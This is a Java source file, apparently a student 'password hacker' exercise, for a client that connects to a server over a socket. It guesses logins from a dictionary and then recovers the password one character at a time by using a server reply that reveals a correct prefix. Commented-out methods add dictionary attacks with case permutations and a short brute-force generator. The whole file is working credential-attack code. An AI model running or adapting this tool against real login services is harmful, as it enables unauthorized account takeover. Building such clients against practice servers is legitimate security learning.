package hacker;

import com.google.gson.Gson;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Iterator;
import java.util.List;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;


//gson messages
// built from login
//password
//find login
//find first ch of password
//find password from there


@SuppressWarnings("RedundantLabeledSwitchRuleCodeBlock")
public class Main {
    static final File DATA_FOLDER = new File("data");
    static final File LOGS_FOLDER = new File("logs");

    static File passwordDictionary;
    static File usernameDictionary;
    static List<String> passwordList;
    static List<String> loginList;

    static Logger parentLogger = Logger.getLogger(Main.class.getPackageName());
    static Logger logger = Logger.getLogger(Main.class.getCanonicalName());

//  logger setup

    static {
        //noinspection ResultOfMethodCallIgnored
        DATA_FOLDER.mkdirs();
        //noinspection ResultOfMethodCallIgnored
        LOGS_FOLDER.mkdirs();

        try {
            parentLogger.setLevel(Level.INFO);
            FileHandler fh = new FileHandler(LOGS_FOLDER.getPath() + "/hacker.log");
            fh.setFormatter(new SimpleFormatter());
            parentLogger.addHandler(fh);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not create dictionary", e);
        }
    }

//  dictionaries setup
//  todo dynamically/user set dictionaries

    static {
        passwordDictionary = new File(DATA_FOLDER, "passwords.txt");
        usernameDictionary = new File(DATA_FOLDER, "logins.txt");

        logger.info("attempting password dictionary read");
        try (BufferedReader br = new BufferedReader(new FileReader(passwordDictionary))) {
            passwordList = br.lines().toList();
        } catch (FileNotFoundException e) {
            logger.log(Level.SEVERE, "Could not read password dictionary, file not found", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not read password dictionary", e);
        }

        logger.info("attempting login dictionary read");
        try (BufferedReader br = new BufferedReader(new FileReader(usernameDictionary))) {
            loginList = br.lines().toList();
        } catch (FileNotFoundException e) {
            logger.log(Level.SEVERE, "Could not read username dictionary, file not found", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Could not read username dictionary", e);
        }
    }

    static NetClient client;

    private static String pw;
    private static String login;
    private static String prefix = "";

    public static void main(String[] args) {
        if (args.length != 2) {
            System.out.println("Invalid number of arguments!");
            System.exit(1);
        }
        String address = args[0];
        int port = Integer.parseInt(args[1]);

        logger.info("Connecting to " + address + ":" + port);
        try (Socket socket = new Socket(address, port)) {
            client = new NetClient(socket);
            Request request;

            ResponseType responseType = ResponseType.BAD_LOGIN;
            //finite state machine?
            //dynamically take appropriate action based on response?

            Iterator<String> loginGen = loginList.iterator();
            Iterator<String> chGen = new BruteForceGenerator(1);

            do {
                switch (responseType) {
                    case BAD_LOGIN -> {
                        //gen logins
                        if (loginGen.hasNext()) {
                            login = loginGen.next();
                            pw = "A";
                        } else {
                            throw new RuntimeException("Ran out of logins");
                        }
                    }
                    case BAD_PASSWORD -> {

                        if (chGen.hasNext()) {
                            pw = prefix + chGen.next();
                        } else {
                            throw new RuntimeException("Ran out of first characters");
                        }

                    }
                    case BAD_REQUEST -> {
                        throw new IllegalStateException("Invalid format or missing fields");
                    }
                    case PREFIX_MATCH -> {
                        prefix = pw;
                        chGen = new BruteForceGenerator(1);
                        pw = prefix + chGen.next();
                    }
                    case EXCEPTION -> {
                        throw new IllegalStateException("Ayo wtf");
                    }
                    default -> throw new IllegalStateException("Ayo wtf");
                }
                request = new Request(login, pw);
                Response response = new Gson().fromJson(client.sendAndReceive(request), Response.class);
                responseType = ResponseType.getByMsg(response.result());
            } while (responseType != ResponseType.SUCCESS);


            client.close();
            client = null;


            System.out.println(new Gson().toJson(request));


        } catch (UnknownHostException e) {
            logger.log(Level.SEVERE, "Unknown host", e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "I/O exception", e);
        }


    }
/*
    public static void dictionaryAttack(List<String> dictionary) {
        logger.info("dictionary called");
        for (String word : dictionary) {
            logger.info(word);
            int combinations = 1 << word.length(); // 2^length of the word
            char[] currentCombination = new char[word.length()];

            for (int i = 0; i < combinations; i++) {
                int temp = i;
                for (int j = 0; j < word.length(); j++) {
                    // Check each bit to decide whether to uppercase the character
                    if ((temp & 1) == 1) {
                        currentCombination[j] = Character.toUpperCase(word.charAt(j));
                    } else {
                        currentCombination[j] = word.charAt(j);
                    }
                    temp >>= 1; // Shift right for the next character
                }
                String potential = new String(currentCombination);
                logger.info(potential);

                if (Objects.equals(client.sendAndReceive(potential), "Connection success!")) {
                    pw = potential;
                    return;
                }
            }
        }
    }

    public static void optimizedDictionaryAttack(List<String> dictionary) {
        logger.info("dictionary called");
        for (String word : dictionary) {
            logger.info(word);

            // Count number of alpha characters in a word
            long alphaCount = word.chars().filter(Character::isAlphabetic).count();

            // calculate combinations as power of 2 based on count of alpha characters
            int combinations = 1 << alphaCount;

            char[] currentCombination = word.toCharArray();
            for (int i = 0; i < combinations; i++) {
                int temp = i;
                for (int j = 0, alphaIndex = 0; j < word.length() && alphaIndex < alphaCount; j++) {
                    // Only proceed with loop if character is alpha else skip
                    if (Character.isAlphabetic(word.charAt(j))) {
                        // Check each bit to decide whether to uppercase the character
                        if ((temp & 1) == 1) {
                            currentCombination[j] = Character.toUpperCase(word.charAt(j));
                        } else {
                            currentCombination[j] = Character.toLowerCase(word.charAt(j));
                        }
                        temp >>= 1; // Shift right for the next character
                        alphaIndex++;
                    }
                }
                String potential = new String(currentCombination);
                logger.info(potential);
                if (Objects.equals(client.sendAndReceive(potential), "Connection success!")) {
                    pw = potential;
                    return;
                }
            }
        }
    }

    public static void bruteForceAttack() {
        for (int maxLength = 0; maxLength < 5; maxLength++) {
            generate("", maxLength);
        }
    }

    public static void generate(String current, int maxLength) {
        if (current.length() == maxLength) {
            if (pw != null) {
                return;
            }
            if (Objects.equals(client.sendAndReceive(current), "Connection success!")) {
                pw = current;
            }
            return;
        }

        // Loop through 'a' to 'z'
        for (char c = 'a'; c <= 'z'; c++) {
            if (pw != null) {
                return;
            }
            generate(current + c, maxLength);
        }

        // Loop through '0' to '9'
        for (char c = '0'; c <= '9'; c++) {
            if (pw != null) {
                return;
            }
            generate(current + c, maxLength);
        }
    }
    */
}
